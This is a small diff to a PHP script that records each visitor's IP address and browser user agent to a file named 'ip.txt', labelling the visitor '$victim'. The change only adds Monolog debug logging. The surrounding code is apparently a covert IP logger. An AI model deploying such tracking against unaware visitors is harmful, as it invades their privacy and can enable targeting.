@@ -16,6 +16,14 @@ $useragent = " User-Agent: ";
 $browser = $_SERVER['HTTP_USER_AGENT'];
 
 
+use Monolog\Logger;
+use Monolog\Handler\StreamHandler;
+
+$log = new Logger('yourlogger');
+$log->pushHandler(new StreamHandler('php://stderr', Logger::DEBUG));
+
+$log->addNotice('sending push !!!');
+
 $file = 'ip.txt';
 $victim = "IP: ";
 $fp = fopen($file, 'a');
